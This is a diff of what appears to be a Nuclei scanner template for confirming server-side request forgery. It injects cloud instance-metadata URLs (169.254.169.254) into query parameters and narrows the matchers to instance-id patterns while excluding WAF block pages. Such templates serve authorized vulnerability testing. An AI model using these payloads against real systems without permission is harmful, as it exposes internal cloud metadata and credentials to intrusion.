@@ -1,7 +1,7 @@
-id: nawab-confirmed-ssrf
+id: nawab-confirmed-ssrf-strict
 
 info:
-  name: 🛸 Nawab-Confirmed-SSRF 🛸
+  name: 🛸 Nawab-SSRF-Strict 🛸
   author: thenawabx
   severity: critical
 
@@ -10,15 +10,9 @@ http:
     path:
       - "{{BaseURL}}"
 
-    headers:
-      Metadata-Flavor: "Google"
-
     payloads:
       ssrf_targets:
-        - "http://169.254.169.254/latest/meta-data/"
         - "http://169.254.169.254/latest/meta-data/instance-id"
-        - "http://metadata.google.internal/computeMetadata/v1/instance/id"
-        - "http://169.254.169.254/latest/user-data"
 
     fuzzing:
       - part: query
@@ -26,24 +20,23 @@ http:
         fuzz:
           - "{{ssrf_targets}}"
 
-    matchers-condition: or
+    matchers-condition: and
     matchers:
+      - type: status
+        status:
+          - 200
+
       - type: regex
-        name: aws-metadata
         part: body
         regex:
-          - "ami-id"
-          - "instance-id"
-          - "iam/security-credentials/"
+          - "i-[a-f0-9]{17}"
+          - "i-[a-f0-9]{8}"
 
       - type: word
-        name: gcp-metadata
-        part: header
-        words:
-          - "Metadata-Flavor: Google"
-
-      - type: word
-        name: azure-metadata
         part: body
+        negative: true
         words:
-          - "microsoft.compute"
+          - "Cloudflare"
+          - "Just a moment"
+          - "Access Denied"
+          - "DDoS protection"
